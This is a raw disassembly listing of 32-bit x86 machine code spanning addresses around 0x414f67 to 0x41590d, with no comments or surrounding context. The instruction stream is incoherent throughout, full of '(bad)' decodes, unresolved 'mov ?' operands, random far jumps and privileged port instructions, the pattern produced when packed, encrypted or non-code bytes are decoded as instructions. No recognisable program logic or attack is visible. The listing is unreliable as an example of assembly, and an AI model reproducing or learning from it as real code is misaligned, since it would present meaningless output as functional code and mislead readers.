  414f67:	inc    edx
  414f68:	jl     0x414f99
  414f6a:	sub    al,0x33
  414f6c:	bound  ebx,QWORD PTR [ecx]
  414f6e:	or     al,BYTE PTR [esi-0x77da34c4]
  414f74:	jae    0x414f6a
  414f76:	xchg   ebx,eax
  414f77:	and    al,0xae
  414f79:	dec    ebp
  414f7a:	mov    dh,dh
  414f7c:	xor    ah,ch
  414f7e:	xor    cl,dh
  414f80:	mov    edx,0x8a2eabb1
  414f85:	jns    0x414f46
  414f87:	sub    DWORD PTR [esi-0x1b],edi
  414f8a:	icebp  
  414f8b:	xchg   edx,eax
  414f8c:	lahf   
  414f8d:	cld    
  414f8e:	dec    ecx
  414f8f:	pop    edx
  414f90:	mov    ecx,0xc1cc17be
  414f95:	xor    eax,0x471555c9
  414f9a:	adc    esp,DWORD PTR [edx-0xf]
  414f9d:	inc    esp
  414f9e:	dec    esp
  414f9f:	std    
  414fa0:	shl    DWORD PTR [esi],1
  414fa2:	pop    es
  414fa3:	dec    BYTE PTR [edx+0x29]
  414fa6:	fwait
  414fa7:	adc    ah,bl
  414fa9:	punpckldq mm4,DWORD PTR [eax-0x25]
  414fad:	push   es
  414fae:	jge    0x414fb9
  414fb0:	mov    ah,0x2
  414fb2:	xchg   ebp,eax
  414fb3:	outs   dx,DWORD PTR ds:[esi]
  414fb4:	jmp    FWORD PTR [edi-0x555ea4d9]
  414fba:	test   eax,0x36638f20
  414fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fc0:	imul   eax,DWORD PTR [ebx-0x2e0d157],0x7a
  414fc7:	mov    ?,WORD PTR [esi-0x18407c6b]
  414fcd:	mov    ah,BYTE PTR [ecx+0x1ceef09f]
  414fd3:	and    BYTE PTR [ebx],bh
  414fd5:	bound  esi,QWORD PTR ds:0x91e0fa64
  414fdb:	and    dh,ah
  414fdd:	mov    ebx,0xfa0219f1
  414fe2:	std    
  414fe3:	xor    al,0x19
  414fe5:	cli    
  414fe6:	bound  esp,QWORD PTR [esi+ecx*1]
  414fe9:	or     DWORD PTR [ecx-0x1075cfcc],0x1006c89
  414ff3:	mov    ds:0xaee2f068,eax
  414ff8:	lods   al,BYTE PTR ds:[esi]
  414ff9:	pop    ebp
  414ffa:	ret    0x32ff
  414ffd:	gs (bad) 
  414fff:	iret   
  415000:	cld    
  415001:	fs pop es
  415003:	neg    ecx
  415005:	mov    ebx,edx
  415007:	pop    eax
  415008:	idiv   cl
  41500a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500b:	sbb    bh,BYTE PTR [ebp+0x606abf87]
  415011:	adc    ecx,DWORD PTR [ebx-0x61]
  415014:	(bad)  
  415015:	mov    ebx,0xc800f300
  41501a:	(bad)  
  41501b:	std    
  41501c:	mov    bl,0xfb
  41501f:	cmp    eax,0xaff07ddd
  415024:	mov    dh,0x1a
  415026:	ficom  DWORD PTR [edi-0xda66cf9]
  41502c:	lods   al,BYTE PTR ds:[esi]
  41502d:	mov    edx,DWORD PTR [edx]
  41502f:	js     0x4150a2
  415031:	test   BYTE PTR [ebx],0x4
  415034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415035:	fmul   DWORD PTR [edi+0x63]
  415038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415039:	enter  0xefcb,0xe
  41503d:	jns    0x41500f
  41503f:	sub    BYTE PTR [esi],bl
  415041:	mov    cl,0x35
  415043:	add    eax,DWORD PTR [esi-0x333dfe39]
  415049:	fidivr DWORD PTR [ecx+ebp*1]
  41504c:	jmp    0xcb6f:0xdf297891
  415053:	mov    BYTE PTR [ebx+0x10],dl
  415056:	imul   eax,DWORD PTR [ebx+0xf],0x7e
  41505a:	nop
  41505b:	aad    0x69
  41505d:	lahf   
  41505e:	mov    ebp,0xe4b792ab
  415063:	inc    esi
  415064:	inc    edx
  415065:	pop    ds
  415066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415067:	pop    sp
  415069:	into   
  41506a:	inc    DWORD PTR [esi+eiz*4+0x1d]
  41506e:	jb     0x41503c
  415070:	pop    edi
  415071:	pushf  
  415072:	sub    bh,BYTE PTR [ebp-0x65]
  415075:	in     al,dx
  415076:	mov    edx,0x5d0f2b3c
  41507b:	je     0x415085
  41507d:	idiv   BYTE PTR [ebp-0x2d0c47c7]
  415083:	rcr    BYTE PTR ds:0x18ab806a,cl
  415089:	setge  BYTE PTR [edx+0x69]
  41508d:	xchg   edi,eax
  41508e:	sub    eax,0x1aabe77f
  415093:	cli    
  415094:	mov    ecx,0xc5f9cf15
  415099:	les    edx,FWORD PTR [ebx+0x1c197690]
  41509f:	bound  cx,DWORD PTR [ebp+0x12]
  4150a3:	xor    dl,BYTE PTR [ebp-0xa022732]
  4150a9:	not    ebx
  4150ab:	retf   0x3722
  4150ae:	push   eax
  4150af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b0:	(bad)  [esi]
  4150b2:	mov    ah,0x5e
  4150b4:	adc    bh,bl
  4150b6:	mov    ebp,0x4f617029
  4150bb:	imul   ecx,DWORD PTR [ebx+0x27],0xffffffab
  4150bf:	sbb    ebx,DWORD PTR [edx]
  4150c1:	push   edx
  4150c2:	fidiv  WORD PTR [edx]
  4150c4:	inc    ebp
  4150c5:	lods   al,BYTE PTR ds:[esi]
  4150c6:	cmc    
  4150c7:	(bad)
	...
  41529a:	add    BYTE PTR [eax],al
  41529c:	add    BYTE PTR [ebp-0x7f],bl
  41529f:	sub    dl,0xde
  4152a2:	jmp    0x415321
  4152a4:	mov    bh,0xe6
  4152a6:	or     BYTE PTR [eax-0x2e],0xe3
  4152aa:	mov    al,ds:0x5a7baa52
  4152af:	add    DWORD PTR [eax],eax
  4152b1:	and    BYTE PTR [edi],al
  4152b3:	add    BYTE PTR [eax],al
  4152b5:	mov    ds:0xc3375934,eax
  4152ba:	jo     0x415291
  4152bc:	or     ebp,esi
  4152be:	test   eax,0x86444064
  4152c3:	mov    ah,0xdf
  4152c5:	jb     0x4152e2
  4152c7:	mov    eax,ds:0x8bd5f53
  4152cc:	mov    ds:0x348d7805,al
  4152d1:	es ds mov dh,0x3e
  4152d5:	outs   dx,BYTE PTR ds:[esi]
  4152d6:	mov    fs,WORD PTR [edi+0x1a]
  4152d9:	sbb    BYTE PTR [ecx-0x479c5276],ch
  4152df:	push   eax
  4152e0:	(bad)  
  4152e1:	(bad)  [eax+eiz*4-0x52a4aea1]
  4152e8:	mov    dl,0x59
  4152ea:	jecxz  0x41527c
  4152ec:	outs   dx,DWORD PTR ds:[esi]
  4152ed:	std    
  4152ee:	cmc    
  4152ef:	xchg   edi,eax
  4152f0:	jns    0x41528b
  4152f2:	dec    esp
  4152f3:	push   ecx
  4152f4:	fld    DWORD PTR ds:[esi]
  4152f7:	sbb    ch,cl
  4152f9:	pop    edx
  4152fa:	imul   esi,DWORD PTR [esi+0x63],0x78
  4152fe:	scas   al,BYTE PTR es:[edi]
  4152ff:	and    al,0x6e
  415301:	test   DWORD PTR [ebx-0xa60b9ee],0x38562acb
  41530b:	mov    BYTE PTR es:[edi+edi*4-0x3f918610],dl
  415313:	dec    ebp
  415314:	adc    al,0x6c
  415316:	xchg   BYTE PTR [esp+ecx*8+0xd39fb19],al
  41531d:	dec    DWORD PTR [ebp-0x7d]
  415320:	push   0x7b986b20
  415325:	outs   dx,DWORD PTR ds:[esi]
  415326:	call   edx
  415328:	out    dx,al
  415329:	sub    al,0xc7
  41532b:	cmp    DWORD PTR cs:[ebx+0x5f168027],edi
  415332:	mov    BYTE PTR [eax+edx*2-0x45bfea74],bl
  415339:	stos   BYTE PTR es:[edi],al
  41533a:	es push 0xffffffab
  41533d:	pop    ss
  41533e:	imul   BYTE PTR [ecx+0x76788623]
  415344:	mov    ebx,es
  415346:	sub    DWORD PTR [edx+ecx*1],0x39
  41534a:	sbb    DWORD PTR [ebx+0x7b],esi
  41534d:	inc    edx
  41534e:	jl     0x4153b7
  415350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415351:	lds    esp,FWORD PTR [edx]
  415353:	ror    DWORD PTR [ebp+0x66],1
  415356:	inc    eax
  415357:	xlat   BYTE PTR ds:[ebx]
  415358:	xor    eax,0xec52355a
  41535d:	mov    al,0x20
  41535f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415360:	push   cs
  415361:	stc    
  415362:	or     edx,DWORD PTR [ecx+edi*2-0x1a9135a7]
  415369:	hlt    
  41536a:	mov    bl,0xe7
  41536c:	mov    bl,bl
  41536e:	adc    al,0x6d
  415370:	pop    ebx
  415371:	outs   dx,BYTE PTR ds:[esi]
  415372:	jmp    0x78f7:0x10bcbbea
  415379:	stos   DWORD PTR es:[edi],eax
  41537a:	push   eax
  41537b:	jecxz  0x415327
  41537d:	call   0x7c39:0x4494d3fa
  415384:	enter  0x6a24,0x75
  415388:	xor    eax,0x3926a327
  41538d:	std    
  41538e:	push   edx
  41538f:	cmp    dh,BYTE PTR [edx+0x3]
  415392:	sbb    esp,DWORD PTR [esp+esi*8]
  415395:	jmp    0x20f70491
  41539a:	mov    bh,0x69
  41539c:	push   0xffffffed
  41539e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539f:	and    DWORD PTR [eax],edx
  4153a1:	neg    BYTE PTR [ebp+0x205c0a21]
  4153a7:	aad    0xf5
  4153a9:	and    esi,edx
  4153ab:	aaa    
  4153ac:	enter  0x28c1,0xf5
  4153b0:	or     al,0xfc
  4153b2:	pop    eax
  4153b3:	mov    edx,0x9c830244
  4153b8:	sti    
  4153b9:	cwde   
  4153ba:	mov    al,ds:0xb0f8526c
  4153bf:	(bad)  
  4153c0:	jb     0x4153ce
  4153c2:	outs   dx,BYTE PTR ds:[esi]
  4153c3:	mov    ah,0xa
  4153c5:	cmp    DWORD PTR [ecx-0x6],ebx
  4153c8:	call   0xbfc7cd4e
  4153cd:	xor    ch,BYTE PTR [ebp-0x79]
  4153d0:	mov    bl,0xdc
  4153d2:	rol    esi,0x37
  4153d5:	jmp    0xb9d1:0xa278bfa0
  4153dc:	das    
  4153dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153de:	hlt    
  4153df:	pop    esi
  4153e0:	or     al,0x3f
  4153e2:	repnz push 0x4b
  4153e5:	loopne 0x41539a
  4153e7:	repnz lahf 
  4153e9:	and    al,dh
  4153eb:	dec    esi
  4153ec:	ror    DWORD PTR [edx+0x6fa80e6e],cl
  4153f2:	bnd jno 0x415464
  4153f5:	mov    ch,0x74
  4153f7:	push   esp
  4153f8:	sahf   
  4153f9:	jle    0x41541a
  4153fb:	or     esi,0x4e3e6f3
  415401:	(bad)  
  415402:	in     eax,0xe8
  415404:	mov    eax,0xf9fdf43e
  415409:	ror    ebp,0xc0
  41540c:	xor    edx,DWORD PTR [edi+0x68]
  41540f:	sub    dh,BYTE PTR [ebx]
  415411:	inc    eax
  415412:	mov    BYTE PTR [ebp+0x74],0x10
  415416:	dec    edx
  415417:	inc    esp
  415418:	dec    edi
  415419:	mov    ebp,0x48726778
  41541e:	stos   BYTE PTR es:[edi],al
  41541f:	cmp    al,BYTE PTR [ecx]
  415421:	jg     0x41544a
  415423:	push   0x41f860a2
  415428:	xchg   ebp,esi
  41542a:	loop   0x415494
  41542c:	fst    QWORD PTR [eax+ecx*2]
  41542f:	stc    
  415430:	mov    dh,0x59
  415432:	push   cs
  415433:	stos   BYTE PTR es:[edi],al
  415434:	dec    BYTE PTR [edx-0x4e1d3c56]
  41543a:	fdivr  QWORD PTR ds:0xd24c6145
  415440:	pop    edx
  415441:	or     eax,0x457a5ab3
  415446:	popa   
  415447:	pusha  
  415448:	int    0xd1
  41544a:	mov    ds:0xd8720406,al
  41544f:	push   es
  415450:	adc    BYTE PTR [edx-0x5a05fe8f],dh
  415456:	pop    DWORD PTR [ebx]
  415458:	cmp    al,BYTE PTR [ecx+0x58]
  41545b:	push   eax
  41545c:	aam    0x73
  41545e:	push   cs
  41545f:	out    dx,eax
  415460:	xchg   esi,eax
  415461:	into   
  415462:	adc    al,0xf5
  415464:	mov    eax,0xfe24cbb4
  415469:	push   cs
  41546a:	lock in al,0xf9
  41546d:	ins    DWORD PTR es:[edi],dx
  41546e:	loop   0x415498
  415470:	adc    ecx,eax
  415472:	xchg   ecx,eax
  415473:	adc    BYTE PTR [eax-0x1e],bh
  415476:	pop    ds
  415477:	xchg   ecx,eax
  415478:	imul   ebp,DWORD PTR [eax],0xffffffea
  41547b:	les    edi,FWORD PTR [eax+0x1b760803]
  415481:	mov    esi,0x900cf32b
  415486:	popf   
  415487:	mov    edx,0xd7d67afb
  41548c:	push   esi
  41548d:	out    dx,al
  41548e:	addr16 xchg ebp,eax
  415490:	or     DWORD PTR [edx-0x5e7de7d4],edx
  415496:	lds    esp,FWORD PTR [ecx-0x23db7e54]
  41549c:	fs ret 0xad5d
  4154a0:	mov    al,ds:0xdf197faf
  4154a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a6:	xchg   edi,eax
  4154a7:	cmc    
  4154a8:	je     0x4154a4
  4154aa:	adc    bl,BYTE PTR [edi+0x45]
  4154ad:	sbb    eax,0xfd277c2f
  4154b2:	jnp    0x41543a
  4154b4:	jl     0x415444
  4154b6:	add    al,0x1d
  4154b8:	out    dx,al
  4154b9:	(bad)  
  4154bb:	lds    edx,FWORD PTR [esi+0x70]
  4154be:	sub    bl,al
  4154c0:	push   ebx
  4154c1:	and    eax,0x3e185d1c
  4154c6:	cld    
  4154c7:	xchg   edi,eax
  4154c8:	jge    0x415490
  4154ca:	dec    ebp
  4154cc:	or     bh,dh
  4154ce:	push   ds
  4154cf:	lds    ebx,FWORD PTR [ebx-0x29]
  4154d2:	arpl   WORD PTR [edx],si
  4154d4:	xor    eax,0x1a31af51
  4154d9:	fild   QWORD PTR [eax+0x30]
  4154dc:	push   ebp
  4154dd:	dec    edi
  4154de:	jmp    0xb3da:0x933c2a9b
  4154e5:	push   edi
  4154e6:	or     al,0x28
  4154e8:	pop    ecx
  4154e9:	shl    BYTE PTR [ecx-0x5aaf8947],0x65
  4154f0:	mov    dh,0x15
  4154f2:	pop    esi
  4154f3:	inc    ebp
  4154f4:	repz sbb eax,0x7c090c45
  4154fa:	xor    dl,dh
  4154fc:	jle    0x41550d
  4154fe:	xchg   esp,eax
  4154ff:	jbe    0x41548f
  415501:	mov    ah,0x96
  415503:	cld    
  415504:	pusha  
  415505:	adc    eax,0x59c7b998
  41550a:	cmp    ch,BYTE PTR [ebp-0x6582597c]
  415510:	push   eax
  415511:	mov    esp,0x1cac4e9a
  415516:	scas   eax,DWORD PTR es:[edi]
  415517:	xor    ebp,DWORD PTR [ebx-0x20]
  41551a:	loop   0x4154c1
  41551c:	sbb    DWORD PTR [esi-0x270f1137],ebp
  415522:	leave  
  415523:	aaa    
  415524:	sub    dh,bh
  415526:	and    eax,0x98f1386a
  41552b:	and    DWORD PTR [esi-0x24],0x207c38eb
  415532:	sub    DWORD PTR [ebp+0x25],0xc11fa0c8
  415539:	mov    dl,BYTE PTR [eax+0x4ef2fc26]
  41553f:	push   edi
  415540:	out    dx,eax
  415541:	das    
  415542:	mov    dh,0xb0
  415544:	adc    al,0xed
  415546:	xor    eax,0xaf73278c
  41554b:	adc    al,0xda
  41554d:	imul   edi,DWORD PTR [esp+0xc4a1fce],0x47
  415555:	xchg   esp,eax
  415556:	stos   BYTE PTR es:[edi],al
  415557:	pop    eax
  415558:	jecxz  0x415548
  41555a:	loop   0x4154e0
  41555c:	jmp    0xbefe:0xb9bfc3d0
  415563:	pop    esi
  415564:	shr    ch,1
  415566:	jnp    0x415578
  415568:	adc    ebp,DWORD PTR [ebx+0x304d4cb3]
  41556e:	mov    ch,0x31
  415570:	push   ebp
  415571:	stos   DWORD PTR es:[edi],eax
  415572:	mov    eax,ds:0x19d89494
  415577:	sar    BYTE PTR [ecx],1
  415579:	jnp    0x4155f8
  41557b:	push   ebx
  41557c:	sti    
  41557d:	fimul  DWORD PTR [edx+0x33900820]
  415583:	xchg   esp,eax
  415584:	lods   eax,DWORD PTR ds:[esi]
  415585:	rol    dl,0xf1
  415588:	cs retf 
  41558a:	inc    edi
  41558b:	dec    ebp
  41558c:	and    ah,BYTE PTR [edx]
  41558e:	lods   al,BYTE PTR ds:[esi]
  41558f:	out    0xc1,al
  415591:	xchg   ecx,eax
  415592:	ins    DWORD PTR es:[edi],dx
  415593:	jl     0x415538
  415595:	mov    dh,0xf2
  415597:	(bad)  
  415598:	push   edi
  415599:	xchg   ebx,eax
  41559a:	xlat   BYTE PTR ds:[ebx]
  41559b:	push   ebp
  41559c:	mov    bh,0xd
  41559e:	(bad)  [eax-0x60aff5c3]
  4155a4:	mov    gs,WORD PTR [ebx+edx*1+0x5a0c8a35]
  4155ab:	cli    
  4155ac:	(bad)  
  4155ad:	cmp    DWORD PTR [eax-0x70],ebp
  4155b0:	cmp    eax,0xff5dee6f
  4155b5:	(bad)  
  4155b6:	int3   
  4155b7:	ja     0x4155fa
  4155b9:	sub    BYTE PTR [ebp+0x4b0c704b],al
  4155bf:	(bad)  
  4155c0:	in     al,0xc0
  4155c2:	xor    al,0x27
  4155c4:	push   0xffffffb6
  4155c6:	sbb    al,0x7b
  4155c8:	ins    DWORD PTR es:[edi],dx
  4155c9:	mov    esi,ebp
  4155cb:	rol    BYTE PTR [edx+0xf],0x59
  4155cf:	cmp    cl,BYTE PTR [edx-0x73]
  4155d2:	sub    al,0x38
  4155d4:	mov    BYTE PTR [ecx-0x3205922a],dl
  4155da:	stc    
  4155db:	popa   
  4155dc:	cmp    bl,BYTE PTR [ebp-0x4989a3bd]
  4155e2:	sub    cl,BYTE PTR [ebx+edx*2-0x7f6b4609]
  4155e9:	repnz dec edi
  4155eb:	stos   BYTE PTR es:[edi],al
  4155ec:	push   esi
  4155ed:	adc    edi,DWORD PTR [ebp-0xa]
  4155f0:	jmp    0xfb277ee6
  4155f5:	js     0x415651
  4155f7:	dec    ebx
  4155f8:	or     eax,0xe82ead61
  4155fd:	fwait
  4155fe:	jl     0x4155ae
  415600:	push   ds
  415601:	imul   ebp,DWORD PTR ds:0xf116e22b,0xffffffde
  415608:	xor    al,0xad
  41560a:	mov    dl,0xde
  41560c:	mov    edi,0x691390d8
  415611:	mov    bh,0xb1
  415613:	sbb    eax,0xff0c90a4
  415618:	stos   DWORD PTR es:[edi],eax
  415619:	ins    BYTE PTR es:[edi],dx
  41561a:	scas   al,BYTE PTR es:[edi]
  41561b:	dec    esp
  41561c:	sbb    BYTE PTR [ebp-0x60401c1b],bl
  415622:	mov    cl,0x72
  415624:	add    esp,DWORD PTR [edx]
  415626:	sbb    ebx,DWORD PTR [esi+esi*8-0x50]
  41562a:	pop    ebp
  41562b:	inc    esi
  41562c:	mov    esp,0x6c142623
  415631:	sub    bh,dh
  415633:	mov    ch,0x0
  415635:	adc    eax,DWORD PTR [edi]
  415637:	jae    0x41567a
  415639:	add    DWORD PTR [eax],ebx
  41563b:	jge    0x4156b1
  41563d:	inc    ebp
  41563e:	int3   
  41563f:	jmp    0x55a9:0x40beb017
  415646:	xor    BYTE PTR [ecx],ch
  415648:	ret    0xa89
  41564b:	cdq    
  41564c:	inc    esi
  41564d:	and    bl,BYTE PTR [ebx-0x1e]
  415650:	out    0x57,eax
  415652:	jle    0x4156ba
  415654:	push   ecx
  415655:	retf   0xae40
  415658:	fistp  WORD PTR [ebp+0x67]
  41565b:	loopne 0x41560e
  41565d:	ss aam 0x15
  415660:	les    eax,FWORD PTR [ebx+0x37a4b91e]
  415666:	gs jo  0x4156be
  415669:	adc    DWORD PTR [ebp+0x1f],ebx
  41566c:	jge    0x41560e
  41566e:	lea    ebp,[ecx+0x8]
  415671:	sti    
  415672:	les    ecx,FWORD PTR [edi+esi*8]
  415675:	mov    edi,0x2a890bfc
  41567a:	or     BYTE PTR cs:[eax+esi*2-0xd],al
  41567f:	call   0xda26:0xb5a17cf1
  415686:	popa   
  415687:	push   ebx
  415688:	push   esi
  415689:	mov    eax,0xe0ca950b
  41568e:	fild   QWORD PTR [ecx+0x15f99c7d]
  415694:	std    
  415695:	in     eax,0x6b
  415697:	retf   
  415698:	mov    ebp,0xcb312994
  41569d:	lods   al,BYTE PTR ds:[esi]
  41569e:	pusha  
  41569f:	mov    bl,bh
  4156a1:	mov    DWORD PTR [eax],ebp
  4156a3:	fcomp  DWORD PTR [edx-0x3]
  4156a6:	inc    eax
  4156a7:	and    DWORD PTR [edx-0xf9920d1],ebp
  4156ad:	enter  0x2ca3,0x37
  4156b1:	xchg   esi,eax
  4156b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b3:	rcr    BYTE PTR [edi-0x7cace019],0x38
  4156ba:	pop    DWORD PTR [eax-0x5b]
  4156bd:	push   0x93aa637b
  4156c2:	nop
  4156c3:	add    DWORD PTR [edi+edi*8],ecx
  4156c6:	out    0xda,eax
  4156c8:	sub    al,0x3a
  4156ca:	adc    ecx,DWORD PTR [esi+0x29]
  4156cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ce:	lods   eax,DWORD PTR ds:[esi]
  4156cf:	inc    edi
  4156d0:	push   edx
  4156d1:	loop   0x4156ce
  4156d3:	mov    bh,BYTE PTR [ebp+0x6f514b]
  4156d9:	aas    
  4156da:	int3   
  4156db:	ja     0x415741
  4156dd:	imul   esp,DWORD PTR [esi+ecx*4+0x26],0x84c6e0a1
  4156e5:	pushf  
  4156e6:	mov    ?,WORD PTR [ebp-0x15]
  4156e9:	and    eax,0x78622e88
  4156ee:	mov    esp,0xc8f94978
  4156f3:	inc    DWORD PTR [edx-0xc]
  4156f6:	es dec esi
  4156f8:	add    DWORD PTR [ecx],ebx
  4156fa:	sbb    BYTE PTR ds:0x8dd65394,cl
  415700:	push   ecx
  415701:	cmp    ebp,DWORD PTR [esp+eiz*2+0x19]
  415705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415706:	mov    al,0x68
  415708:	inc    edx
  415709:	cmp    al,0xbf
  41570b:	mov    al,ds:0x5632bfa5
  415710:	mov    ch,0xc3
  415712:	cs pop esp
  415714:	jbe    0x4156b0
  415716:	cli    
  415717:	add    al,al
  415719:	pop    edx
  41571a:	mov    al,0xfd
  41571c:	add    edx,DWORD PTR [ebx]
  41571e:	retf   
  41571f:	mov    ch,0x66
  415721:	push   ebx
  415722:	pop    eax
  415723:	mov    bl,BYTE PTR [eax-0x75e07891]
  415729:	ss sub cl,bl
  41572c:	xchg   DWORD PTR [ecx],ebp
  41572e:	jmp    FWORD PTR [edx-0xf1a3aec]
  415734:	mov    al,0x6f
  415736:	add    edx,edx
  415738:	add    eax,DWORD PTR [esi+ecx*1]
  41573b:	loope  0x415747
  41573d:	pop    ebx
  41573e:	xchg   esp,eax
  41573f:	mov    DWORD PTR [ecx],esi
  415741:	aaa    
  415742:	or     BYTE PTR [eax+0x6ae006f4],0xb3
  415749:	xor    DWORD PTR [edi],esp
  41574b:	out    0x6f,eax
  41574d:	pop    eax
  41574e:	sti    
  41574f:	cmc    
  415750:	add    eax,0xa08a0575
  415755:	das    
  415756:	ins    BYTE PTR es:[edi],dx
  415757:	mov    ecx,0x143c1a59
  41575c:	mov    ebp,DWORD PTR [ebx+edi*2+0x77]
  415760:	stc    
  415761:	out    0x5c,al
  415763:	add    eax,0xea08a3ed
  415768:	sub    eax,0xc03befcf
  41576d:	mov    WORD PTR [edi+0x59],ss
  415770:	aaa    
  415771:	and    BYTE PTR [esi],bl
  415773:	cmp    edx,DWORD PTR [eax-0x30]
  415776:	call   0x5cd11885
  41577b:	imul   edi,DWORD PTR [ebx],0x5f
  41577e:	loopne 0x415713
  415780:	js     0x41572f
  415782:	outs   dx,BYTE PTR ds:[esi]
  415783:	(bad)  
  415785:	bound  ebx,QWORD PTR [ecx]
  415787:	add    al,0x6d
  415789:	ja     0x4157cd
  41578b:	gs inc edi
  41578d:	adc    DWORD PTR [edx],edi
  41578f:	gs pop ss
  415791:	arpl   WORD PTR [eax+0x328a6d3],ax
  415797:	pop    es
  415798:	sbb    al,BYTE PTR cs:[ebx-0x1c]
  41579c:	jge    0x415746
  41579e:	sub    ebp,DWORD PTR [ecx]
  4157a0:	sbb    bh,al
  4157a2:	jg     0x41573b
  4157a4:	imul   esi,DWORD PTR [edi-0xd4f7e40],0x5826e607
  4157ae:	sbb    BYTE PTR [ecx-0x134b391b],al
  4157b4:	jne    0x41581c
  4157b6:	adc    al,0x72
  4157b8:	cmp    dh,0x53
  4157bb:	imul   esi,esi,0x2
  4157be:	inc    esi
  4157bf:	mov    esp,0x610de43
  4157c4:	retf   0x2dd
  4157c7:	pop    ds
  4157c8:	sub    al,0x18
  4157ca:	push   ebx
  4157cb:	les    esi,FWORD PTR [ecx-0x56]
  4157ce:	pop    ss
  4157cf:	push   0xffffff9f
  4157d1:	call   FWORD PTR [esi]
  4157d3:	outs   dx,BYTE PTR ds:[esi]
  4157d4:	inc    edi
  4157d5:	outs   dx,DWORD PTR ds:[esi]
  4157d6:	jae    0x415827
  4157d8:	jns    0x41576e
  4157da:	adc    al,0x17
  4157dc:	in     al,0x6b
  4157de:	and    al,BYTE PTR [ecx]
  4157e0:	push   edx
  4157e1:	jg     0x415842
  4157e3:	ror    ecx,1
  4157e5:	xor    dl,BYTE PTR [ebp-0x6d]
  4157e8:	jne    0x415867
  4157ea:	dec    ecx
  4157eb:	mov    ebp,0x3ad2bc4d
  4157f0:	jmp    0x4157ee
  4157f2:	pop    ds
  4157f3:	fwait
  4157f4:	add    DWORD PTR [ecx-0x17f56d19],ecx
  4157fa:	icebp  
  4157fb:	pop    es
  4157fc:	fs jecxz 0x41583c
  4157ff:	adc    dh,BYTE PTR [ebp+0x3a]
  415802:	cmp    ch,BYTE PTR [ebp-0x38]
  415805:	pop    es
  415806:	sbb    cl,BYTE PTR [edi-0x6c]
  415809:	pop    eax
  41580a:	sbb    al,ah
  41580c:	icebp  
  41580d:	push   ebx
  41580e:	adc    eax,0xad07f230
  415813:	leave  
  415814:	dec    esi
  415815:	push   edi
  415816:	and    DWORD PTR [ecx-0x75],edi
  415819:	ins    DWORD PTR es:[edi],dx
  41581a:	push   0xffffffe3
  41581c:	mov    eax,0x7caada6a
  415821:	lahf   
  415822:	std    
  415823:	sti    
  415824:	sub    DWORD PTR [edi-0x5f671bae],ebx
  41582a:	add    BYTE PTR [ecx+0x14],cl
  41582d:	arpl   WORD PTR [edx+0x64],sp
  415830:	pop    es
  415831:	test   BYTE PTR gs:[edi-0x4d151ac2],cl
  415838:	loop   0x41589b
  41583a:	(bad)  
  41583b:	out    dx,eax
  41583c:	jno    0x415852
  41583e:	fadd   QWORD PTR [esi-0x1b]
  415841:	icebp  
  415842:	add    eax,0xa0f5f596
  415847:	sbb    al,bh
  415849:	mov    ds:0x69989c5e,eax
  41584e:	into   
  41584f:	(bad)  
  415850:	shr    DWORD PTR [edi+ecx*1+0x295496c4],1
  415857:	pop    ebx
  415858:	fcomp  DWORD PTR [edx+ebp*8-0x48]
  41585c:	mov    ds:0xa5989164,al
  415861:	jno    0x415804
  415863:	xor    BYTE PTR [ecx+ebx*2],dl
  415866:	jb     0x41581f
  415868:	dec    esp
  415869:	call   0xe5a7:0x17cd9418
  415870:	pop    esi
  415871:	xchg   esp,eax
  415872:	xchg   esp,eax
  415873:	enter  0xf897,0x8d
  415877:	out    dx,al
  415878:	popf   
  415879:	adc    DWORD PTR [ebx],ebp
  41587b:	sbb    DWORD PTR [ecx-0x78ec528f],0xffffffdf
  415882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415883:	jl     0x415806
  415885:	fidiv  DWORD PTR [edx-0x54]
  415888:	add    al,0xdf
  41588a:	xchg   BYTE PTR [ecx],ch
  41588c:	repnz stos DWORD PTR es:[edi],eax
  41588e:	add    bl,BYTE PTR [ebp+0x25ed34ea]
  415894:	xchg   DWORD PTR [ecx+0x592620bd],ebp
  41589a:	and    ecx,DWORD PTR [ebx+0x67]
  41589d:	dec    eax
  41589e:	je     0x415831
  4158a0:	ret    0x29bd
  4158a3:	(bad)  
  4158a4:	lock mov eax,0xe29df36
  4158aa:	fisub  WORD PTR [esi+0x14]
  4158ad:	sahf   
  4158ae:	mov    ds:0x4ce6626b,al
  4158b3:	call   0x7de9:0x52101cea
  4158ba:	push   edi
  4158bb:	cwde   
  4158bc:	mov    dh,al
  4158be:	pop    edx
  4158bf:	sti    
  4158c0:	push   gs
  4158c2:	push   ecx
  4158c3:	push   ss
  4158c4:	(bad)  
  4158c5:	ss call 0xd8e9:0x5034e6d4
  4158cd:	jno    0x4158a8
  4158cf:	scas   eax,DWORD PTR es:[edi]
  4158d0:	sbb    ecx,DWORD PTR [esi]
  4158d2:	xor    cl,ah
  4158d4:	xchg   esi,eax
  4158d5:	mov    ebx,0x67859993
  4158da:	cmp    ebx,esi
  4158dc:	pop    ecx
  4158dd:	jns    0x4158f9
  4158df:	or     DWORD PTR [eax+0x0],edi
  4158e2:	div    ebx
  4158e4:	cmp    BYTE PTR [eax+eax*2],dl
  4158e7:	stos   DWORD PTR es:[di],eax
  4158e9:	jle    0x415928
  4158eb:	stc    
  4158ec:	jae    0x41588b
  4158ee:	sub    BYTE PTR ds:0x2c642ad4,bl
  4158f4:	imul   edi,DWORD PTR [ebx+edx*1-0x5ea5e9ad],0xffffffd2
  4158fc:	push   esi
  4158fd:	ret    0xb1ee
  415900:	arpl   WORD PTR [ebp+0x21],ax
  415903:	mov    ecx,0x60d691e2
  415908:	pop    ss
  415909:	cs pop esi
  41590b:	leave  
  41590c:	nop
  41590d:	fidivr WORD PTR [edi+0x16695fa2]
